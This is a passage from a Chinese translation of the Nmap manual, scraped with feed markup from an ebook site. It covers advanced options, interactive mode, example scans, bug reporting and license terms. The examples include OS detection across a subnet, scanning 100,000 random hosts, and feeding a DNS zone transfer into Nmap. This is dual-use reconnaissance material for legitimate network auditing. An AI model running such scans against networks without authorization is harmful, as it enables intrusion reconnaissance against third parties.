<p>分配 IPv6 地址，Nmap 可以采用 免费的隧道代理。一种较好的选择是 BT Exact，位于 <a href="https://tb.ipv6.btexact.com/" target="_blank" rel="external">https://tb.ipv6.btexact.com/</a>。 此外，还有 Hurricane Electric，位于 <a href="http://ipv6tb.he.net/" target="_blank" rel="external">http://ipv6tb.he.net/</a>。6to4 隧道是 另一种常用的免费方法。</p>
<p><code>-A</code> (激烈扫描模式选项)</p>
<p>这个选项启用额外的高级和高强度选项，目前还未确定代表 的内容。目前，这个选项启 用了操作系统检测(-O) 和版本扫描(-sV)，以后会增加更多的功能。 目的是启用一个全 面的扫描选项集合，不需要用户记忆大量的 选项。这个选项仅仅启用功能，不包含用于 可能所需要的 时间选项(如-T4)或细节选项(-v)。</p>
<p><code>--datadir &lt;directoryname&gt;</code> (说明用户 Nmap 数据文件位置)</p>
<p>Nmap 在运行时从文件中获得特殊的数据，这些文件有 nmap-service-probes， nmap-services， nmap-protocols， nmap-rpc， nmap-mac-prefixes 和 nmap-os-fingerprints。Nmap 首先 在–datadir 选项说明的目录中查找这些文件。 未 找到的文件，将在 BMAPDIR 环境变量说明的目录中查找。 接下来是用于真正和有效 UID 的<code>~/.nmap</code> 或 Nmap 可执行代码的位置(仅 Win32)；然后是是编译位置， 如 <code>/usr/local/share/nmap</code> 或 <code>/usr/share/nmap</code>。 Nmap 查找的最后一个位置是当前目录。</p>
<p><code>--send-eth</code> (使用原以太网帧发送)</p>
<p>要求 Nmap 在以太网(数据链路)层而不是 IP(网络层)发送 报文。默认方式下，Nmap 选择 最适合其运行平台的方式，原套接 字(IP 层)是 UNIX 主机最有效的方式，而以太网帧最 适合 Windows 操作 系统，因为 Microsoft 禁用了原套接字支持。在 UNIX 中，如果没有 其 它选择(如无以太网连接)，不管是否有该选项，Nmap 都使用原 IP 包。</p>
<p><code>--send-ip</code> (在原 IP 层发送)</p>
<p>要求 Nmap 通过原 IP 套接字发送报文，而不是低层的以 太网帧。这是–send-eth 选项的 补充。</p>
<p><code>--privileged</code> (假定用户具有全部权限)</p>
<p>告诉 Nmap 假定其具有足够的权限进行源套接字包发送、 报文捕获和类似 UNIX 系统中根 用户操作的权限。默认状态下， 如果由 getuid()请求的类似操作不为 0，Nmap 将退出</p>
<p><code>--privileged</code> 在具有 Linux 内核性能的类似 系统中使用非常有效 这些系统配置允许非 特权用户可以进行 原报文扫描。需要明确的是，在其它选项之前使用这些需要权 限的 选项(SYN 扫描、操作系统检测等)。Nmap_PRIVILEGED 变量 设置等价于–privileged 选 项。</p>
<p><code>--interactive</code> (在交互模式中启动)</p>
<p>在交互模式中启动 Nmap，提供交互式的 Nmap 提示，便于 进行多个扫描(同步或后台方 式)。对于从多用户系统中扫描 的用户非常有效，这些用户常需要测试他们的安全性，</p>
<p>但不希望 系统中的其它用户知道他们扫描哪些系统。使用–interactive 激活这种方 式，然后输入 h 可 获得帮助信息。由于需要对正确的 shell 程序和整个功能非常熟悉， 这个选项很少使用。这个选项包含了一个!操作符，用于执行 shell 命令， 这是不安装 Nmap setuid root 的多个原因之一。</p>
<p><code>-V; --version</code> (打印版本信息) 打印 Nmap 版本号并退出。</p>
<p><code>-h; --help</code> (打印帮助摘要面)</p>
<p>打印一个短的帮助屏幕，列出大部分常用的 命令选项，这个功能与不带参数运行 Nmap 是相同的。</p>
<h2 id="十五、_运行时的交互">十五、 运行时的交互</h2><p><strong>Nmap 目前还不具有这个功能，本节内容可能会增加或删除。</strong></p>
<p>在执行 Nmap 时，所有的键盘敲击都被记录。这使得用户可以与 程序交互而不需要终止或重启 特定的键可改变选项，其它键会输出 一个有关扫描的状态消息。约定如下，小写字母增加 打 印量，大写字母减少打印量。</p>
<p><code>v / V</code></p>
<p>增加 / 减少细节</p>
<p><code>d / D</code></p>
<p>提高 / 降低调试级别</p>
<p><code>p / P</code></p>
<p>打开/ 养老报文跟踪</p>
<p>其它</p>
<p>打印的信息类似于：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stats: 0:00:08 elapsed; 111 hosts completed (5 up)&#65292; 5 undergoing Service Scan Service scan Timing: About 28.00% done; ETC: 16:18 (0:00:15 remaining)</span><br></pre></td></tr></table></figure>
<h2 id="十六、_实例">十六、 实例</h2><p>下面给出一些实例，简单的、复杂的到深奥的。为更具体，一 些例子使用了实际的 IP 地址和 域名。在这些位置，可以使用你自己网络 的地址/域名替换。注意，扫描其它网络不一定合法 一些网络管理员不愿看到 未申请过的扫描，会产生报怨。因此，先获得允许是最好的办法。</p>
<p>如果是为了测试，scanme.nmap.org 允许被扫描。但仅允许使用 Nmap 扫描并禁止测试漏洞或进 行 DoS 攻击。为 保证带宽，对该主机的扫描每天不要超过 12 次。如果这个免费扫描服务被 滥 用 系统将崩溃而且 Nmap 将报告解析 指定的主机名/IP 地址失败 scanme.nmap.org 这些免 费 扫描要求也适用于 scanme2.nmap.org、 scanme3.nmap.org 等等，虽然这些 主机目前还不存在</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v scanme.nmap.org</span><br></pre></td></tr></table></figure>
<p>这个选项扫描主机 scanme.nmap.org 中 所有的保留 TCP 端口。选项-v 启用细节模式。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -O scanme.nmap.org/24</span><br></pre></td></tr></table></figure>
<p>进行秘密 SYN 扫描，对象为主机 Saznme 所在的“C 类”网段 的 255 台主机。同时尝试确定每台 工作主机的操作系统类型。因为进行 SYN 扫描 和操作系统检测，这个扫描需要有根权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 22&#65292;53&#65292;110&#65292;143&#65292;4564 198.116.0-255.1-127</span><br></pre></td></tr></table></figure>
<p>进行主机列举和 TCP 扫描，对象为 B 类 188.116 网段中 255 个 8 位子网。这 个测试用于确定系 统是否运行了 sshd、DNS、imapd 或 4564 端口。如果这些端口 打开，将使用版本检测来确定哪 种应用在运行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -iR 100000 -P0 -p 80</span><br></pre></td></tr></table></figure>
<p>随机选择 100000 台主机扫描是否运行 Web 服务器(80 端口)。由起始阶段 发送探测报文来确定 主机是否工作非常浪费时间，而且只需探测主机的一个端口，因 此使用-P0 禁止对主机列表。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -P0 -p80 -oX logs/pb-port80scan.xml -oG logs/pb-port80scan.gnmap 216.163.128.20/20</span><br></pre></td></tr></table></figure>
<p>扫描 4096 个 IP 地址，查找 Web 服务器(不 ping)，将结果以 Grep 和 XML 格式保存。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host -l company.com | cut -d -f 4 | nmap -v -iL -</span><br></pre></td></tr></table></figure>
<p>进行 DNS 区域传输，以发现 company.com 中的主机，然后将 IP 地址提供给 Nmap。上述命令用 于 GNU/Linux – 其它系统进行区域传输时有不同的命令。</p>
<h2 id="十七、_Bugs">十七、 Bugs</h2><p>和作者一样，Nmap 也不是完美的，但可以通过发送 Bug 报告甚至编写 补丁使其更加完善。如果 Nmap 不能满足要求，首先从 <a href="http://www.insecure.org/nmap/" target="_blank" rel="external">http://www.insecure.org/nmap/</a> 升级最新版本。如果总问题仍然 存在，需要进行调查以确定问题是否 已经被解决。在 <a href="http://seclists.org/" target="_blank" rel="external">http://seclists.org/</a>尝试搜索出错消息 或 浏览 Nmap-dev 档案，以及仔细阅读使用手册。如果问题还是不能解决，发送 Bug 报告至 <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#x3a;&#x6e;&#x6d;&#x61;&#x70;&#x2d;&#x64;&#101;&#118;&#x40;&#105;&#x6e;&#x73;&#101;&#99;&#117;&#x72;&#x65;&#x2e;&#111;&#x72;&#x67;">&#x6e;&#x6d;&#x61;&#x70;&#x2d;&#x64;&#101;&#118;&#x40;&#105;&#x6e;&#x73;&#101;&#99;&#117;&#x72;&#x65;&#x2e;&#111;&#x72;&#x67;</a>。在报告中包含所有 有关问题的信息，以及所使用的 Nmap 版本、操 作系统版本。问题报告以及 Nmap 的使用问题发送给 nmap-dev@insecure.org 比直接发送给 Gyodor 能更好回答。</p>
<p>解决 Bug 的代码补丁比 Bug 报告更受欢迎 在 <a href="http://www.insecure.org/nmap/data/HACKING" target="_blank" rel="external">http://www.insecure.org/nmap/data/HACKING</a> 可 获得建立补丁文件的基本指令。补丁可发送给 nmap-dev(建议) 或直接发给 Fyodor。</p>
<h2 id="十八、_作者">十八、 作者</h2><p>Fyodor <a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#x3a;&#102;&#x79;&#111;&#x64;&#x6f;&#114;&#64;&#105;&#x6e;&#x73;&#101;&#99;&#117;&#114;&#x65;&#46;&#111;&#114;&#103;">&#102;&#x79;&#111;&#x64;&#x6f;&#114;&#64;&#105;&#x6e;&#x73;&#101;&#99;&#117;&#114;&#x65;&#46;&#111;&#114;&#103;</a> (<a href="http://www.insecure.org" target="_blank" rel="external">http://www.insecure.org</a>)</p>
<p>译者：Fei Yang <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#58;&#x66;&#x79;&#x61;&#x6e;&#x67;&#49;&#x30;&#50;&#x34;&#64;&#x67;&#109;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;">&#x66;&#x79;&#x61;&#x6e;&#x67;&#49;&#x30;&#50;&#x34;&#64;&#x67;&#109;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;</a>, Lei Li <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#111;&#58;&#x6c;&#x69;&#108;&#101;&#105;&#x5f;&#x37;&#x32;&#49;&#x40;&#54;&#x36;&#x31;&#49;&#46;&#x6f;&#x72;&#x67;">&#x6c;&#x69;&#108;&#101;&#105;&#x5f;&#x37;&#x32;&#49;&#x40;&#54;&#x36;&#x31;&#49;&#46;&#x6f;&#x72;&#x67;</a> 近年来，上百的人们为 Nmap 作出了极有价值的贡献，详细信息参见 随 Nmap 一起发布的 CHANGELOG 文件， 也可查看 <a href="http://www.insecure.org/nmap/nmap_changelog.html" target="_blank" rel="external">http://www.insecure.org/nmap/nmap_changelog.html</a>。</p>
<h2 id="十九、_法律事项(版权、许可证、担保(缺)、出口限制)">十九、 法律事项(版权、许可证、担保(缺)、出口限制)</h2><h3 id="Unofficial_Translation_Disclaimer_/_非官方翻译声明">Unofficial Translation Disclaimer / 非官方翻译声明</h3><p>This is an unnofficial translation of the <a href="http://www.insecure.org/nmap/man/man-legal.html" target="_blank" rel="external">Nmap license details</a> into [Finnish]. It was not written by Insecure.Com LLC, and does not legally state the distribution terms for Nmap – only the original English text does that. However, we hope that this translation helps [Finish] speakers understand the Nmap license better.</p>
<p>这是 Nmap 许可证明细 的非官方的中文译本。它并非由 Insecure.Com LLC 编写，不是有法律效 力的 Nmap 发布条款－－只有原英文版具有此法律效力。然而，我们希望该译本帮助中文用户更 好地理解 Nmap 许可证。</p>
<p>在 <a href="http://www.insecure.org/nmap/" target="_blank" rel="external">http://www.insecure.org/nmap/</a>可获得 Nmap 的最新版本。</p>
<p>Nmap 安全扫描器(C) 1996-2005 是 Insecure.Com LLC 的产品。 Nmap 也是 Insecure.Com LLC 的注册商标。这是一个免费软件，按照免费软件联盟 V2.0 的 GNU 普通公共许可证的规定，可以 重新发布和/或修改。这保证用户在一定的条件下可以使用、修改和重新发布此软件。如果需要 将 Nmap 嵌入专用软件，我们会销售相应的许可证(联系 <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x73;&#x61;&#108;&#x65;&#x73;&#64;&#x69;&#x6e;&#115;&#101;&#99;&#117;&#x72;&#101;&#x2e;&#x63;&#x6f;&#109;">&#x73;&#x61;&#108;&#x65;&#x73;&#64;&#x69;&#x6e;&#115;&#101;&#99;&#117;&#x72;&#101;&#x2e;&#x63;&#x6f;&#109;</a>)。很多安全扫 描器厂商已经获得了 Nmap 技术的许可证，如主机发现、端口扫描、OS 系统检测以及服务/版本 检测等技术。</p>
<p>注意，GPL 对“衍生工作”有重要的限制，但未给出有关的详细描述。为避免误解，我们认为如 果某个应用进行以下工作时被认为是该许可证的 “衍生工作”：</p>
<ul>
<li>集成 Nmap 的源代码</li>
<li>读取或包含 Nmap 拷贝权的数据文件，如 nmap-os-fingerprints 或 nmap-service-probes.</li>
<li>执行 Nmap 并解析结果(与之相反的是，shell 执行或执行菜单应用，仅仅显示原始 Nmap 输出，则不是衍生工作。)</li>
<li>将 Nmap 集成/包含/组合至一个专用的可执行安装程序 如由 InstallShield 生成的安装 程序。</li>
<li>将 Namp 链接到进行上述工作的库或程序中。</li>
</ul>
<p>名词“Nmap”包含了 Nmap 的任何部分以及衍生工作，因此不仅限于上述内容。上述内容使用了 一些常见的例子来说明衍生工作。这些限制仅适用于真正重新发布 Nmap 时。例如，不禁止开发 和销售 Nmap 的前端，可以任意发布，但必须说明从 <a href="http://www.insecure.org/nmap/" target="_blank" rel="external">http://www.insecure.org/nmap/</a>下载 Nmap</p>
<p>这些条款并不是在 GPL 之上增加限制，只是为了明确说明与 Nmap(有 GPL 许可证) 产品有关的 “衍生工作”。这类似于 Linus Torvalds 对 Linux 内核模块“衍生工作”的解释。我们的解释 仅适用于 Nmap - 不适合其它 GPL 产品。</p>
<p>如果对有 GPL 许可证限制的 Nmap 应用于非 GPL 工作有任何问题，我们将提供相关的帮助。如上 述条款所述，我们提供了可选的许可证以集成 Nmap 到专用应用和设备，这些合同已被销售给多 个安全厂商，通常都包含了永久的许可证以及提供优先支持、更新，并资助可持续的 Nmap 技术 开发。请发送邮件至 <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#58;&#115;&#x61;&#x6c;&#x65;&#x73;&#64;&#x69;&#110;&#115;&#x65;&#99;&#x75;&#x72;&#x65;&#x2e;&#x63;&#111;&#x6d;">&#115;&#x61;&#x6c;&#x65;&#x73;&#64;&#x69;&#110;&#115;&#x65;&#99;&#x75;&#x72;&#x65;&#x2e;&#x63;&#111;&#x6d;</a> 以获得更多信息。</p>
<p>作为 GPL 的一个特殊例外 Insecure.Com LLC 授权许可链接该程序的代码至任何版本的 OpenSSL 库，这个库的发布符合等同于 Copying.OpenSSL 文件中包含的许可证，它的发布同时包含了两 个内容。除 OpenSSL 外，在任何方面都必须遵守 GNU GPL。如果改变这个文件，就可能超出该文 件的版本，但并不对此负责。</p>
<p>如果收到书面的许可证协定或合同文件，与上述条款不同时，该可选的许可证协定具有优先权 Nmap 软件提供源代码，这是因为我们认为用户有权在运行之前知道程序的工作内容，同时也使</p>
<p>用户可以检查软件的漏洞(目前还未发现)。</p>
<p>源代码还允许被移植到新的平台 修改 Bug 以及增加新功能 鼓励用户向 <a href="&#109;&#x61;&#x69;&#108;&#x74;&#111;&#58;&#x66;&#121;&#x6f;&#x64;&#x6f;&#114;&#x40;&#x69;&#110;&#x73;&#101;&#99;&#x75;&#x72;&#x65;&#46;&#x6f;&#x72;&#103;">&#x66;&#121;&#x6f;&#x64;&#x6f;&#114;&#x40;&#x69;&#110;&#x73;&#101;&#99;&#x75;&#x72;&#x65;&#46;&#x6f;&#x72;&#103;</a> 发送更新，以并入正式的发布中。发送这些更新至 Fyodor 或 Insecure.Org 开发列表，表明允 许 Fyodor 和 Insecure.Com LLC 具有无限止的、非独有的权限来使用、修改和重新定义这些代 码的许可证。 Nmap 将一直以开放代码的方式提供，由于无法进行代码的许可证重新定义从而可 能导致了对其它开放软件项目的破坏问题(如 KDEt NASM)，这一点很重要。偶尔我们会向第三方 提供重新定义的代码许可证。如果希望为自己的贡献说明一个特定的许可证条件，在发送时指 明。</p>
<p>本程序的发布只是为了应用，不提供任何担保，也不隐含任何有关特定目的的商业或适用性担 保。在 <a href="http://www.gnu.org/copyleft/gpl.html" target="_blank" rel="external">http://www.gnu.org/copyleft/gpl.html</a> 的 GNU 通用公共许可证或 Nmap 中包含的 COPYING 文件中可查看更多细节。</p>
<p>还需要注意，Nmap 已经导致了一些编写拙劣的应用程序、TCP/IP 栈甚至操作系统的崩溃。Nmap 不能用于破坏关键系统，除非准备好系统受到崩溃的影响。Nmap 可能会造成系统或网络的崩溃 但我们不对 Nmap 可能产生的破坏和问题负任何责任。</p>
<p>由于崩溃的风险以及一些攻击者在攻击系统前使用 Nmap 进行检测，因此一些管理员对此感到不 安，报怨他们的系统受到扫描。因此，建议在扫描之间获得允许，哪怕是对一个网络很轻微的 扫描。</p>
<p>为安全起见，不要将 Nmap 安装在有特殊权限的环境(如 suid root)。</p>
<p>这个产品包含了由 <a href="http://www.apache.org/" target="_blank" rel="external">Apache Software Foundation</a> 开发的软件，发布时还包含了 <a href="http://www.tcpdump.org/" target="_blank" rel="external">Libpcap</a> 可移植 包捕获器的改进版本。Windows 版的 Nmap 使用了源于 <a href="http://www.winpcap.org/" target="_blank" rel="external">WinPcap library</a> 的 libpcap。正常的描 述支持由 <a href="http://www.pcre.org/" target="_blank" rel="external">PCRE library</a> 提供，这也是一个开放源码软件，由 Philip Hazel 编写。特定的原网 络功能使用了 <a href="http://libdnet.sourceforge.net/" target="_blank" rel="external">Libdnet</a> 网络库，由 Dug Song 编写，Nmap 发布时带有一个改进版本。Nmap 可以 与 <a href="http://www.openssl.org/" target="_blank" rel="external">OpenSSL 加密工具库</a>链接用于 SSL 版本检测。所有本段描述的第三方软件在遵守 BSD 风格软 件许可证下均可以免费发布。</p>
<p>美国出口控制：Insecure.Com LLC 认为 Nmap 归入美国 ECCN(出口控制分类编码) 5D922。这个 分类称为“不受 5D002 控制的信息安全软件”。这个分类的唯一限制是 AT(反恐怖主义)，这个 限制几乎适用于所有的产品，禁止出口到一些国家，如伊朗和朝鲜。因此，出口 Nmap 不需要任 何特殊的许可证、允许或其它政府授权。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="Table_of_Contents">Table of Contents</h2><ul>
<li>描述</li>
<li>译注</li>
<li>选项概要</li>
<li>目标说明</li>
<li>主机发现</li>
<li>端口扫描基础</li>
<li>端口扫描技术</li>
<li>端口说明和扫描顺序</li>
<li>服务和版本探测</li>
<li>操作系统探测</li>
<li>时间和性能</li>
<li>防火墙/IDS</li>
<li>躲避和哄骗</li>
<li>输出</li>
<li>其它选项</li>
<li>运行时的交互</li>
<li>实例</li>
<li>Bugs</li>
<li>作者</li>
<li>法律事项（版权、许可证、担保、出口限制）</li>
<li>Unofficial Translation Disclaimer</li>
</ul>]]>
    
    </summary>
    
      <category term="渗透" scheme="http://it-ebooks.flygon.net/tags/%E6%B8%97%E9%80%8F/"/>
    
      <category term="网络" scheme="http://it-ebooks.flygon.net/tags/%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[C++ Template 进阶指南]]></title>
    <link href="http://it-ebooks.flygon.net/cpp-template-%E8%BF%9B%E9%98%B6%E6%8C%87%E5%8D%97/"/>
    <id>http://it-ebooks.flygon.net/cpp-template-进阶指南/</id>
    <published>2016-02-14T06:06:07.000Z</published>
    <updated>2016-02-14T06:07:03.886Z</updated>
    <content type="html"><![CDATA[<h2 id="在线阅读">在线阅读</h2><ul>
<li><a href="https://github.com/wuye9036/CppTemplateTutorial" target="_blank" rel="external">在线阅读</a></li>
</ul>
<h2 id="下载">下载</h2><ul>
<li><a href="https://github.com/wuye9036/CppTemplateTutorial/archive/master.zip" target="_blank" rel="external">Markdown格式</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="在线阅读">在线阅读</h2><ul>
<li><a href="https://github.com/wuye9036/CppTemplateTutorial" target="_blank" rel="external">在线阅读</a></li>
</ul>]]>
    </summary>
    
      <category term="cpp" scheme="http://it-ebooks.flygon.net/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Boost C++ 库]]></title>
    <link href="http://it-ebooks.flygon.net/the-boost-cpp-libraries/"/>
    <id>http://it-ebooks.flygon.net/the-boost-cpp-libraries/</id>
    <published>2016-02-11T12:19:05.000Z</published>
    <updated>2016-02-11T12:20:20.726Z</updated>
    <content type="html"><![CDATA[<p><img src="data:image/webp;base64,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